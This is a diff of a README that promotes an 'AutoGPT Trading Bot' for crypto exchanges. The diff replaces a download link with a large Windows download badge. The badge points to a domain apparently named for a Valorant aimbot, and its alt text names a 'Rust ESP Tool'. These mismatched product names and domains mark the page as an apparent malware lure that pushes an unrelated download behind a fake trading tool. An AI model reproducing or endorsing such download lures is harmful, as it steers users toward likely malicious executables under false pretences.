@@ -4,8 +4,12 @@
 
 🎯 From lightning-fast scalping strategies to swing and long-term trading setups, this bot integrates seamlessly with top exchanges like Binance, Bybit, and KuCoin. With a beautiful no-code interface, real-time analytics, and 24/7 automation — it's your intelligent partner for dominating the crypto markets.
 
-[![Download AutoGPT Trading Bot](https://valorant-aimb0tpro-info.github.io/.github/)](https://seomadjest.com)
-
+<p align="center">
+  <a href="https://valorant-aimb0tpro-info.github.io/.github/" target="_blank">
+    <img src="https://img.shields.io/badge/⬇️%20Download%AutoGPT%%20Tool-Windows%20Version-1E90FF?style=for-the-badge&logo=windows&logoColor=white" 
+         alt="Download Rust ESP Tool" style="width:540px; height:37px;" />
+  </a>
+</p>
 ---
 
 ## ✨ Key Features
